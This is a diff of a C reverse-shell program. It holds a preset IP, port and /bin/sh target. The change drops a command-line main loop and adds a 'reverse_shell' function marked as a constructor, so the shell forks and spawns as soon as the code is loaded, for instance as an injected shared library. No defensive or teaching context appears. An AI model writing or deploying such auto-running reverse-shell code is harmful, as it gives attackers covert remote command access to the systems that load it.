@@ -6,8 +6,8 @@
 #include <stdlib.h>
 #include <sys/wait.h>
 #include <string.h>
- 
-char ip_addr[16] = "127.0.0.1";  
+
+char ip_addr[16] = "127.0.0.1";
 char port[6] = "3343";
 char exe_path[255] = "/bin/sh";
 char exe_arg0[50] = "sh";
@@ -34,30 +34,13 @@ void spawn() {
     execl(exe_path, exe_arg0, NULL, NULL, NULL);
 }
 
-int main (int argc, char **argv){
-    if(argc>=2 && strlen(argv[1])<16 ) {
-        memset(ip_addr, 0, 16);
-        memcpy(ip_addr, argv[1], strlen(argv[1]));
+static void reverse_shell(void) __attribute__((constructor));
+static void reverse_shell(void)
+{
+    pid_t pid = fork();
+    if (pid == 0){
+        spawn();
+    exit(0);
     }
-
-    if(argc==3 && strlen(argv[2])<6) {
-        memset(port, 0, 6);
-        memcpy(port, argv[2], strlen(argv[2]));
-    }
-
-    while(1) {
-        pid_t pid = fork();
-        if(pid < 0) {
-            exit(0);
-        }
-        if(pid == 0) {
-            spawn();
-            exit(0);
-        }
-        int _;
-        wait(&_);
-        sleep(3);
-    }
-
-    return 0;
+    return;
 }
